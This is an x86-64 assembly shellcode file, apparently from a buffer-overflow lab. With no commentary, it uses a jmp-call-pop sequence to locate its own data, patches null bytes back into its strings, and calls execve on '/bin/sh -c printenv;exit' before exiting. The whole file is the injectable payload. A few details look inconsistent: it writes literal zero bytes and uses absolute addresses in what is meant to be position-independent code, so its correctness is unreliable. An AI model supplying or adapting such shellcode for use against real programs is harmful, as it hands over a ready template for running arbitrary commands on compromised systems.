          bits 64
            ; find out where we are
start:     jmp short codeEnd
start2:    pop rsi ; rsi holds exeStr address

            ; clear the a register
           mov rax,0x0

            ; restore null bytes to data
           mov [rsi+flagStr-exeStr-2],al
           mov [rsi+cmdStr-exeStr-1],al
           mov [rsi+arrayAddr-exeStr-1],al
           mov [rsi+arrayAddr-exeStr+24],rax

           mov [arrayAddr], rsi
           lea rdi, [byte rsi+flagStr-exeStr]
           mov [arrayAddr+8] , rdi
           lea rdi, [byte rsi+cmdStr-exeStr]
           mov [arrayAddr+16] , rdi
                 
            ; execve system call
           mov rax,0x3b
           mov rdi,exeStr
           mov rsi,arrayAddr
           mov rdx, rsp
           shr rdx, 4
           shl rdx, 4
           mov ecx, 0xf7fbe600
           or  rdx, rcx
           syscall

            ; exit system call
           mov rdi,rax
           xor rax, rax
           mov al, 0x3c
           syscall

codeEnd:   call start2
            ; data
exeStr:    db "/bin/shXy"
flagStr:   db "-cX"
cmdStr:    db "printenv;exitX"
arrayAddr: dq exeStr
           dq flagStr
           dq cmdStr
           dq 0xffffffffffffffff
newAddr:   dq newAddr-start
